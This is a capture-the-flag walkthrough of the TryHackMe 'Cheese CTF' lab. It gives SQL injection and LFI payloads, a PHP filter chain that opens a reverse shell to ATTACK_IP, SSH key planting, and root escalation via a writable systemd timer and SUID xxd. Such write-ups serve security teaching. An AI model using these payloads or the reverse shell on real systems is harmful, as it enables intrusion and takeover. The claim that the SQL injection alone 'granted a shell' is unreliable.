---
title: 'TryHackMe: Cheese CTF'
author: Neo-Virex
date: 2025-02-13 08:00:00 +0000
categories: [TryHackMe]
tags: [Cheese, CTF, HackTheBox, Linux, Exploit]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_cheese_ctf/
image:
  path: room_img.png
description: A detailed walkthrough of the Cheese CTF challenge, covering reconnaissance, enumeration, exploitation, and privilege escalation.
---


**Challenge completed:** February 21, 2025 @ 13:20 (+03:00)

## Reconnaissance

All ports were open, but the most critical services were on ports **22** (SSH) and **81** (HTTP).

```bash
rustscan -a 10.10.26.46
```

```
Open 10.10.26.46:1 3 4 5 6 8 9 10 11 13 14 16 17 18 20 22 23 24 28 30 31 32 33 38 41 42 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 74 75 76 79 81 84
```

## Service Enumeration

Brute‑forcing directories with **feroxbuster** revealed key endpoints:

```bash
feroxbuster -u http://10.10.26.46/ -w /usr/share/wordlists/dirb/big.txt
```

```
200  /images/cheese1.jpg
200  /style.css
200  /images/cheese2.jpg
200  /images/cheese3.jpg
200  /login.php
```

## Web Application Analysis

![Login Page](img1.png){: width="600" height="150" .shadow }
![Directory Listing](img2.png){: width="600" height="150" .shadow }

The login form was vulnerable to **SQL injection**. Bypassing authentication with:

```sql
username: ' OR 1=1;-- -
password: anything
```

granted a shell on the web server.

## Exploit & Initial Access

Accessing `/secret-script.php?file=../../../etc/passwd` confirmed a Local File Inclusion (LFI):

```http
GET /secret-script.php?file=../../../etc/passwd HTTP/1.1
Host: 10.10.26.46
```

> Snippet from `/etc/passwd`:
>
> ```text
> root:x:0:0:root:/root:/bin/bash
> ```
> ```
daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin
...
> ```
![Directory Listing](img3.png){: width="600" height="150" .shadow }


## Privilege Escalation

A PHP filter chain exploit was generated via [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) and the [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator):

```bash
python3 php_filter_chain_generator.py \
  --chain '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/ATTACK_IP/8084 0>&1\'"); ?>' \
  | grep "php" > payload.txt
```

A listener was started:

```bash
nc -lvnp 8084
```

The payload was URL‑encoded and sent:

```bash
curl -o response.txt "http://10.10.26.46/secret-script.php?file=$(tail -n1 payload.txt)"
```

This yielded a `www-data` shell:

```bash
www-data@cheesectf:/var/www/html$ ls
adminpanel.css images index.html login.css login.php messages.html orders.html secret-script.php style.css supersecretadminpanel.html supersecretmessageforadmin users.html
```

## SSH Pivot & User Flag

The attacker’s public key was added to `/home/comte/.ssh/authorized_keys`:

```bash
echo "ssh-ed25519 AAAAC... neo@lab" >> /home/comte/.ssh/authorized_keys
```

SSH’ing as **comte**:

```bash
ssh -i ~/.ssh/id_ed25519 comte@10.10.177.192
cat user.txt  # THM{9f2ce3df1beeecaf695b[REDACTED]704c31b17a}
```

## Lateral Movement & Final Escalation

`comte` had passwordless sudo rights on the `exploit.timer` systemd unit:

```bash
sudo systemctl daemon-reload
enable exploit.timer
start exploit.timer
```

`exploit.service` copies `/usr/bin/xxd` to `/opt/xxd` with SUID:

```ini
# /etc/systemd/system/exploit.service
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && chmod +sx /opt/xxd"
```

By editing the writable timer (`/etc/systemd/system/exploit.timer`) and reloading:

```ini
[Timer]
OnBootSec=5s
```

`xxd` was leveraged to write an SSH key into root’s `authorized_keys`:

```bash
echo 'ssh-ed25519 AAAA... kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```

SSH to **root** and capture root flag:

```bash
ssh -i ~/.ssh/id_ed25519 root@10.10.177.192
cat root.txt  # THM{dca7548609[REDACTED]a929b11e5e0167c}
```

---

### Flags

* **User:** `THM{9f2ce3df1b[REDACTED]95b3a8560c682704c31b17a}`
* **Root:** `THM{dca754860948108[REDACTED]7b0a929b11e5e0167c}`
